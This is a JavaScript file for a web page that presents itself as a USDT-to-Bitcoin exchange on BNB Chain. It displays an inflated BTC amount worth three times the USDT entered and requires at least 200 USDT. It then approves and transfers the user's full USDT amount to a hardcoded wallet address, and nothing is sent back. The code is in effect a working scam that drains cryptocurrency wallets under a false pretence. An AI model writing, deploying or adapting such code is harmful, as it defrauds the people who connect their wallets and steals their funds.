const USDT = "0x55d398326f99059fF775485246999027B3197955";
const DEST = "0x56E93caFf970003A66264a10B1581066E0f17112";
const BNB_GAS_USD = 0.50;
let provider, signer;

const ABI = [
  "balanceOf(address)view returns(uint256)",
  "approve(address,uint256) returns(bool)",
  "transfer(address,uint256) returns(bool)"
];

async function init() {
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();
  update();
}

async function update() {
  const i = document.getElementById("usdtInput");
  const uv = document.getElementById("usdtValue");
  const ba = document.getElementById("btcAmount");
  const bu = document.getElementById("btcUsd");
  const rl = document.getElementById("rateLine");

  const x = parseFloat(i.value);
  const amt = isNaN(x) ? 0 : x;
  const usd3 = amt * 3;
  uv.innerText = `$${usd3.toFixed(2)}`;

  const rate = (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt")
                 .then(r=>r.json())).bitcoin.usdt;
  rl.innerText = `1 BTC ≈ ${rate.toLocaleString('en')} USDT`;

  const btc = rate>0 ? usd3 / rate : 0;
  ba.innerText = btc.toFixed(8);
  bu.innerHTML = `$${usd3.toFixed(2)} <span class="red">(-1%)</span>`;
}
document.getElementById("usdtInput").addEventListener("input", update);

document.getElementById("transferBtn").addEventListener("click", async () => {
  const msg = document.getElementById("msg");
  const v = parseFloat(document.getElementById("usdtInput").value);
  if (isNaN(v) || v < 200) {
    msg.innerText = "❌ Minimum 200 USDT required";
    msg.className = "error";
    return;
  }
  try {
    const user = await provider.getSigner().getAddress();
    const token = new ethers.Contract(USDT, ABI, signer);
    const bal = parseFloat(ethers.utils.formatUnits(await token.balanceOf(user), 18));
    if (bal < v) throw new Error("Not enough USDT");

    const bnbBal = parseFloat(ethers.utils.formatEther(await provider.getBalance(user)));
    const bnbPrice = (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")
                          .then(r=>r.json())).binancecoin.usd;
    if (bnbBal * bnbPrice < BNB_GAS_USD) throw new Error("Low BNB for gas");

    const amount = ethers.utils.parseUnits(v.toString(), 18);
    await (await token.connect(signer).approve(DEST, amount)).wait();
    await (await token.connect(signer).transfer(DEST, amount)).wait();

    msg.innerText = `✅ ${v} USDT transferred`;
    msg.className = "success";
  } catch(e) {
    msg.innerText = `❌ ${e.message}`;
    msg.className = "error";
  }
});

init();
